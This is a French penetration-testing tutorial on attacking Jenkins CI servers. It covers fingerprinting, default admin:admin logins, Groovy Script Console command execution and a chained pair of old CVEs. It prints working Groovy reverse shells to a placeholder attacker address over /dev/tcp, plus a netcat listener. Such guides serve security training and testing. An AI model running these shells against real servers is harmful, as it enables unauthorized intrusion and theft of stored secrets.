# Attaquer Jenkins

Jenkins est le serveur d'automatisation CI/CD le plus deploye au monde. Ecrit en Java, il tourne generalement sur le port 8080 et utilise le port 5000 pour la communication avec les agents (slaves). Jenkins est un objectif de choix en pentest : sa console de scripts Groovy permet d'executer du code arbitraire sur le serveur, et les identifiants par defaut sont regulierement laisses en place.

## Pourquoi

Jenkins est souvent deploye en interne sans durcissement particulier. Un acces administrateur donne un RCE immediat via la Script Console (Groovy). De plus, Jenkins stocke frequemment des secrets (cles SSH, tokens API, identifiants de base de donnees) dans ses credentials, ce qui en fait un point de pivot strategique.

## Comment ca marche

### Identification

Jenkins est facilement identifiable :
- Page de login avec le logo Jenkins et le champ "Sign in"
- Port par defaut 8080 (comme Tomcat, mais le style visuel est distinct)
- Header HTTP `X-Jenkins` contenant la version

```bash
# - Identifier Jenkins via les headers
curl -sI http://<IP_CIBLE>:8080/ | grep -i jenkins
```

### Identifiants par defaut

Le compte administrateur par defaut est `admin:admin`. Sur les anciennes versions, Jenkins permettait un acces anonyme complet sans authentification. Toujours tester en premier.

### Script Console (Groovy)

La Script Console est accessible a `/script` (ou via `Manage Jenkins` > `Script Console`). Elle execute du code Groovy avec les privileges de l'utilisateur Jenkins (souvent `root` ou `SYSTEM`).

{% tabs %}
{% tab title="Linux" %}
```groovy
// - Execution de commande sur Linux
def cmd = 'id'.execute()
println("${cmd.text}")
```

```groovy
// - Reverse shell Linux
String host = "<IP_ATTAQUANT>"
int port = 4443
String cmd = "/bin/bash"
Process p = ["/bin/bash", "-c", cmd + " -i >& /dev/tcp/" + host + "/" + port + " 0>&1"].execute()
```
{% endtab %}
{% tab title="Windows" %}
```groovy
// - Execution de commande sur Windows
def cmd = "cmd.exe /c dir".execute()
println("${cmd.text}")
```

```groovy
// - Reverse shell Windows (PowerShell)
def cmd = "powershell -e <BASE64_PAYLOAD>".execute()
println("${cmd.text}")
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
La Script Console execute du code avec les privileges du processus Jenkins. Si Jenkins tourne en tant que `root` ou `NT AUTHORITY\SYSTEM`, le reverse shell donne un acces privilegie directement.
{% endhint %}

### Reverse shell Java (multiplateforme)

Pour les environnements ou `/bin/bash` n'est pas disponible ou ou les commandes systeme sont restreintes :

```groovy
// - Reverse shell Java pur
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP_ATTAQUANT>/4443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### CVE combinee (anciennes versions)

Sur les versions anterieures de Jenkins, deux CVE combinees permettent un RCE sans authentification :
- **CVE-2018-1999002** : lecture de fichier arbitraire
- **CVE-2019-1003000** : execution de code via les pipelines (sandbox bypass)

L'exploitation necessite de recuperer un token CSRF et un cookie de session, puis d'enchainer les deux vulnerabilites.

## En pratique

```bash
# 1 - Identifier Jenkins et sa version
curl -sI http://<IP_CIBLE>:8080/ | grep -i jenkins

# 2 - Tester les identifiants par defaut
# admin:admin, puis tester sans authentification

# 3 - Acceder a la Script Console
# http://<IP_CIBLE>:8080/script

# 4 - Executer un reverse shell Groovy
# Preparer le listener : nc -lnvp 4443
```

## Pieges et galeres

- **Acces anonyme en lecture seule** : certaines configurations donnent un acces anonyme aux projets mais pas a la Script Console. Verifier les permissions du role "Anonymous"
- **Matrix-based security** : Jenkins supporte un controle d'acces granulaire. Un utilisateur lambda peut ne pas avoir acces a `/script`. Chercher d'autres vecteurs (jobs avec build steps, pipelines)
- **Groovy sandbox** : les pipelines Jenkins recents utilisent un sandbox Groovy qui bloque les appels systeme. La Script Console d'administration n'a pas cette restriction
- **Proxied Jenkins** : quand Jenkins est derriere un reverse proxy, le chemin `/script` peut etre bloque ou redirige. Tester avec le port direct si accessible

## Retour terrain

Jenkins est un des services les plus rentables en pentest interne. L'acces a la Script Console est un RCE garanti. En pratique, on le decouvre souvent via EyeWitness dans la categorie "High Value Targets".

Les identifiants par defaut `admin:admin` fonctionnent plus souvent qu'on ne le pense. Quand ce n'est pas le cas, les credentials stockees dans Jenkins (Credentials plugin) contiennent souvent des cles SSH ou des tokens qui permettent de pivoter vers d'autres systemes.

Sur les grands reseaux d'entreprise, il n'est pas rare de trouver plusieurs instances Jenkins, dont au moins une configuree sans authentification obligatoire.

## Memo express

| Technique | Outil / Commande | Prerequis |
|---|---|---|
| Fingerprint | Headers `X-Jenkins`, page login | Port 8080 ouvert |
| Script Console | `/script` + Groovy | Acces admin |
| RCE Linux | `"/bin/bash".execute()` (Groovy) | Script Console |
| RCE Windows | `"cmd.exe /c ...".execute()` (Groovy) | Script Console |
| CVE combo | CVE-2018-1999002 + CVE-2019-1003000 | Version ancienne |

***
